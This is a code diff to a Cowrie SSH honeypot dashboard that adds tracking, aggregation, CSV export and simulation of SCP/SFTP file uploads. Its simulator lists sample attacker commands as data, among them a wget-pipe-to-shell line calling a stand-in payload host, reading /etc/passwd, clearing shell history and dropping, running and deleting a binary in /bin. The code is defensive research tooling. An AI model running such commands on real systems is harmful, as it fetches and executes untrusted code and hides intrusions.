@@ -15,6 +15,7 @@ control characters, unknown event ids are ignored, and the page escapes everythi
 """
 
 import csv
+import hashlib
 import io
 import json
 import os
@@ -45,6 +46,7 @@ KINDS = {
     "cowrie.command.failed": "command",
     "cowrie.session.file_download": "download",
     "cowrie.session.file_download.failed": "download",
+    "cowrie.session.file_upload": "upload",      # SCP or SFTP: Cowrie keeps the file, named by its SHA-256
     "cowrie.session.closed": "closed",
 }
 
@@ -65,6 +67,9 @@ def _epoch(ts):
             return datetime.strptime(str(ts)[:19], "%Y-%m-%dT%H:%M:%S").replace(tzinfo=timezone.utc).timestamp()
         except ValueError:
             return None
+
+
+SHA256_RE = re.compile(r"[0-9a-f]{64}")
 
 
 def parse_cowrie(line):
@@ -92,6 +97,11 @@ def parse_cowrie(line):
         ev["input"] = _clean(raw.get("input"), "input") or ""
     elif kind == "download":
         ev["url"] = _clean(raw.get("url"), "url") or ""
+    elif kind == "upload":
+        sha = str(raw.get("shasum") or "").lower()
+        ev["sha256"] = sha if SHA256_RE.fullmatch(sha) else ""
+        ev["filename"] = _clean(raw.get("filename"), "url") or ""
+        ev["dest"] = _clean(raw.get("destfile"), "url") or ""     # SCP gives the target path; SFTP doesn't
     elif kind == "client":
         ev["version"] = _clean(raw.get("version"), "version") or ""
     elif kind == "closed":
@@ -126,10 +136,14 @@ class HoneypotDB:
                 CREATE TABLE IF NOT EXISTS sessions (
                     id TEXT PRIMARY KEY, start REAL, end REAL, ip TEXT, cc TEXT, country TEXT, city TEXT,
                     protocol TEXT, client TEXT, logins INTEGER, shell INTEGER, username TEXT, password TEXT,
-                    commands TEXT, downloads TEXT);
+                    commands TEXT, downloads TEXT, uploads TEXT DEFAULT '[]');
                 CREATE INDEX IF NOT EXISTS sessions_start ON sessions (start);
                 CREATE TABLE IF NOT EXISTS meta (key TEXT PRIMARY KEY, value TEXT);
             """)
+            cols = [r[1] for r in self.db.execute("PRAGMA table_info(sessions)")]
+            if "uploads" not in cols:      # databases from before uploads were kept
+                self.db.execute("ALTER TABLE sessions ADD COLUMN uploads TEXT DEFAULT '[]'")
+                self.db.commit()
 
     def get_meta(self, key):
         with self.lock:
@@ -172,10 +186,12 @@ class HoneypotDB:
     def add_session(self, s):
         g = s.get("geo") or {}
         with self.lock:
-            self.db.execute("INSERT OR REPLACE INTO sessions VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)", (
-                s["id"], s["start"], s["end"], s["ip"], g.get("cc"), g.get("country"), g.get("city"), s["protocol"],
-                s["client"], s["logins"], int(s["shell"]), s["user"], s["password"],
-                json.dumps(s["commands"]), json.dumps(s["downloads"])))
+            self.db.execute(
+                "INSERT OR REPLACE INTO sessions (id, start, end, ip, cc, country, city, protocol, client, logins, "
+                "shell, username, password, commands, downloads, uploads) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)", (
+                    s["id"], s["start"], s["end"], s["ip"], g.get("cc"), g.get("country"), g.get("city"), s["protocol"],
+                    s["client"], s["logins"], int(s["shell"]), s["user"], s["password"],
+                    json.dumps(s["commands"]), json.dumps(s["downloads"]), json.dumps(s.get("uploads") or [])))
             self._commit()
 
     def events_since(self, t):
@@ -211,11 +227,11 @@ class HoneypotDB:
             self.db.execute("DELETE FROM sessions WHERE start < ?", (cutoff,))
             self.db.commit()
 
-    def analysis(self, commands_json, downloads_json="[]"):
-        key = commands_json + "\0" + downloads_json
+    def analysis(self, commands_json, downloads_json="[]", uploaded=False):
+        key = commands_json + "\0" + downloads_json + ("\0u" if uploaded else "")
         a = self._cache.get(key)
         if a is None:
-            a = rules.analyze(json.loads(commands_json), json.loads(downloads_json))
+            a = rules.analyze(json.loads(commands_json), json.loads(downloads_json), uploaded=uploaded)
             if len(self._cache) > 20000:
                 self._cache.clear()
             self._cache[key] = a
@@ -229,18 +245,19 @@ class HoneypotDB:
             return view, index
         with self.lock:
             rows = self.db.execute(
-                "SELECT start, ip, cc, country, username, password, commands, downloads FROM sessions "
-                "WHERE shell = 1 AND commands != '[]' AND start >= ? ORDER BY start", (now - self.retention,)).fetchall()
+                "SELECT start, ip, cc, country, username, password, commands, downloads, uploads FROM sessions "
+                "WHERE shell = 1 AND (commands != '[]' OR uploads != '[]') AND start >= ? ORDER BY start", (now - self.retention,)).fetchall()
         day0 = now - 14 * 86400
         groups, unrec = {}, Counter()
-        for start, ip, cc, country, user, pw, cmds, dls in rows:
-            a = self.analysis(cmds, dls)
+        for start, ip, cc, country, user, pw, cmds, dls, ups in rows:
+            ups = json.loads(ups or "[]")
+            a = self.analysis(cmds, dls, len(ups) > 0)
             fp = a["fingerprint"]
             g = groups.get(fp)
             if g is None:
                 g = groups[fp] = {"fp": fp, "a": a, "cmds": cmds, "n30": 0, "n24": 0, "ips": {}, "cc": Counter(),
                                   "names": {}, "first": start, "last": start, "daily": [0] * 14, "creds": Counter(),
-                                  "hosts": Counter()}
+                                  "hosts": Counter(), "uploads": {}}
             g["n30"] += 1
             g["n24"] += start >= now - 86400
             src = g["ips"].setdefault(ip, {"n": 0, "cc": cc, "country": country, "last": start})
@@ -255,6 +272,10 @@ class HoneypotDB:
             g["creds"][f"{user} / {pw}"] += 1
             for h in a["hosts"]:
                 g["hosts"][h] += 1
+            for sha, name in ups:
+                u = g["uploads"].setdefault(sha, {"n": 0, "names": Counter()})
+                u["n"] += 1
+                u["names"][name] += 1
             for u in a["unrecognized"]:
                 unrec[u] += 1
 
@@ -274,6 +295,9 @@ class HoneypotDB:
                 "creds": [[k, v] for k, v in g["creds"].most_common(3)],
                 "top_countries": [[c, g["names"][c], n] for c, n in g["cc"].most_common(3)],
                 "hosts": [[k, v] for k, v in g["hosts"].most_common(4)],
+                # Files uploaded over SCP/SFTP: [sha256, most common file name, sessions], most frequent first.
+                "uploads": [[sha, u["names"].most_common(1)[0][0], u["n"]] for sha, u in
+                            sorted(g["uploads"].items(), key=lambda kv: -kv[1]["n"])[:6]],
                 # Where it came from, per address: [ip, cc, country, sessions, last seen], busiest first.
                 "sources": [[ip, s["cc"], s["country"], s["n"], round(now - s["last"])] for ip, s in
                             sorted(g["ips"].items(), key=lambda kv: (-kv[1]["n"], -kv[1]["last"]))[:SOURCES_MAX]],
@@ -327,7 +351,7 @@ class HoneypotStore:
                     where = self.geo.lookup(ev["ip"]) or {}
                 s = {"id": ev["session"], "ip": ev.get("ip"), "start": ev["t"], "end": None, "protocol": "ssh",
                      "geo": where or {}, "client": None, "logins": 0, "user": None, "password": None,
-                     "shell": False, "commands": [], "downloads": [], "duration": None}
+                     "shell": False, "commands": [], "downloads": [], "uploads": [], "duration": None}
                 self.sessions[ev["session"]] = s
                 if len(self.sessions) > MAX_SESSIONS:
                     self.sessions.popitem(last=False)
@@ -344,6 +368,8 @@ class HoneypotStore:
                 s["commands"].append(ev["input"])
             elif k == "download" and len(s["downloads"]) < 20:
                 s["downloads"].append(ev["url"])
+            elif k == "upload" and len(s["uploads"]) < 20:
+                s["uploads"].append([ev["sha256"], ev["filename"]])
             elif k == "closed":
                 # Events stored before the duration_ms fix say 0: the timestamps still know.
                 s["end"], s["duration"] = ev["t"], ev["duration"] or max(0.0, ev["t"] - s["start"])
@@ -374,14 +400,14 @@ class HoneypotStore:
         tl = {"sessions": [0] * nb, "logins": [0] * nb, "shells": [0] * nb}
         users, pwds, pairs, cmds, urls, clients = Counter(), Counter(), Counter(), Counter(), Counter(), Counter()
         countries, points = {}, {}
-        n_logins = n_success = n_cmds = n_dl = 0
+        n_logins = n_success = n_cmds = n_dl = n_up = 0
         recent_sessions = 0
         with self.lock:
             events = [e for e in self.events if e["t"] >= cutoff]
             sessions = [s for s in self.sessions.values() if s["start"] >= cutoff]
             feed_src = events[-60:]
-            shells = [dict(s, commands=list(s["commands"]), downloads=list(s["downloads"]))
-                      for s in sessions if s["shell"] and s["commands"]][-6:]
+            shells = [dict(s, commands=list(s["commands"]), downloads=list(s["downloads"]), uploads=list(s["uploads"]))
+                      for s in sessions if s["shell"] and (s["commands"] or s["uploads"])][-6:]
             ses_by_id = {s["id"]: s for s in sessions}
         for e in events:
             b = int((e["t"] - start) // BUCKET)
@@ -403,6 +429,8 @@ class HoneypotStore:
             elif k == "download":
                 n_dl += 1
                 urls[e["url"][:120]] += 1
+            elif k == "upload":
+                n_up += 1
         for s in sessions:
             b = int((s["start"] - start) // BUCKET)
             if 0 <= b < nb:
@@ -439,6 +467,8 @@ class HoneypotStore:
                 text = e["input"]
             elif k == "download":
                 text = e["url"]
+            elif k == "upload":
+                text = f'{e.get("dest") or e.get("filename") or "?"} · sha256 {(e.get("sha256") or "?")[:16]}'
             elif k == "connect":
                 text = e.get("protocol", "")
             elif k == "client":
@@ -458,7 +488,7 @@ class HoneypotStore:
             "last_event_age_s": round(now - self.last_event_at, 1) if self.last_event_at else None,
             "summary": {
                 "sessions": len(sessions), "unique_ips": len({s["ip"] for s in sessions}), "countries": len(countries),
-                "login_attempts": n_logins, "logins_ok": n_success, "commands": n_cmds, "downloads": n_dl,
+                "login_attempts": n_logins, "logins_ok": n_success, "commands": n_cmds, "downloads": n_dl, "uploads": n_up,
                 "sessions_per_min": round(recent_sessions / 10, 1),
             },
             "timeline": dict(tl, bucket_s=BUCKET, start_age_s=round(now - start)),
@@ -474,11 +504,11 @@ class HoneypotStore:
         }
 
     def _shell(self, s, now, place, pindex):
-        a = rules.analyze(s["commands"], s["downloads"], s["user"], s["password"])
+        a = rules.analyze(s["commands"], s["downloads"], s["user"], s["password"], uploaded=bool(s["uploads"]))
         p = pindex.get(a["fingerprint"])
         return {"age_s": round(now - s["start"]), "ip": s["ip"], "protocol": s["protocol"], **place,
                 "username": s["user"], "password": s["password"], "commands": s["commands"][:12],
-                "more": max(0, len(s["commands"]) - 12), "downloads": s["downloads"][:3],
+                "more": max(0, len(s["commands"]) - 12), "downloads": s["downloads"][:3], "uploads": s["uploads"][:3],
                 "duration_s": round(s["duration"]) if s["duration"] is not None else None,
                 "open": s["end"] is None, "label": a["label"], "tags": a["tags"], "summary": a["summary"],
                 "fp": a["fingerprint"], "pattern": p}
@@ -530,7 +560,10 @@ SCRIPTS = [
     (["echo -e \"\\x6F\\x6B\"", "uname -s -v -n -r -m", "ps aux | grep -v grep | grep miner", "pkill -9 xmrig",
       "wget -qO- http://payload.example.net/setup.sh | sh"], 3),
     (["cat /etc/passwd", "ls -la /home", "history -c", "export HISTFILE=/dev/null", "last"], 2),
+    (["ps -ef", "scp -t /bin/{rand}", "LC_ALL=C /bin/{rand}", "LC_ALL=C rm -f /bin/{rand}"], 1),
 ]
+# What simulated SCP uploads "contain": a few, so the same file shows up across sessions like a real campaign.
+FAKE_UPLOADS = [hashlib.sha256(f"simulated payload {i}".encode()).hexdigest() for i in range(3)]
 # Rarer, assembled per run: makes new patterns appear now and then, including commands no rule
 # knows yet (they show up in the patterns screen's "unrecognized" list).
 POOL = [
@@ -642,6 +675,10 @@ class Simulator:
         if got_in:
             for cmd in self._script(t):
                 emit(self.rng.uniform(0.2, 3), "cowrie.command.input", input=cmd)
+                if cmd.startswith("scp -t "):
+                    dest = cmd.split(None, 2)[2]
+                    emit(0.6, "cowrie.session.file_upload", filename=dest.rsplit("/", 1)[-1], destfile=dest,
+                         shasum=self.rng.choice(FAKE_UPLOADS), outfile="", duplicate=False)
                 for url in URL_RE.findall(cmd):
                     emit(0.4, "cowrie.session.file_download.failed", url=url)   # no egress: downloads always fail
         emit(self.rng.uniform(0.5, 5), "cowrie.session.closed", duration_ms=round((t - out[0][0] + 1) * 1000))
@@ -721,7 +758,7 @@ HEALTH_DEBUG_KEYS = ("cowrie_journal", "boot_errors", "cloud_init", "nftables", 
 
 
 CSV_COLUMNS = ["time_utc", "session", "event", "src_ip", "country_code", "country", "city", "protocol",
-               "username", "password", "command", "url", "client_version", "duration_s"]
+               "username", "password", "command", "url", "client_version", "duration_s", "file_name", "sha256"]
 _FORMULA = ("=", "+", "-", "@", "\t", "\r")
 
 
@@ -744,8 +781,8 @@ def csv_rows(events):
         w.writerow([csv_cell(x) for x in (
             datetime.fromtimestamp(ev["t"], timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ"), ev["session"], ev["kind"],
             ev.get("ip"), ev.get("cc"), ev.get("country"), ev.get("city"), ev.get("protocol") or ev.get("session_protocol"),
-            ev.get("username"), ev.get("password"), ev.get("input"), ev.get("url"), ev.get("version"),
-            f"{dur:.1f}" if isinstance(dur, (int, float)) else None)])
+            ev.get("username"), ev.get("password"), ev.get("input"), ev.get("url") or ev.get("dest"), ev.get("version"),
+            f"{dur:.1f}" if isinstance(dur, (int, float)) else None, ev.get("filename"), ev.get("sha256"))])
         if n % 2000 == 0:
             yield buf.getvalue()
             buf.seek(0)
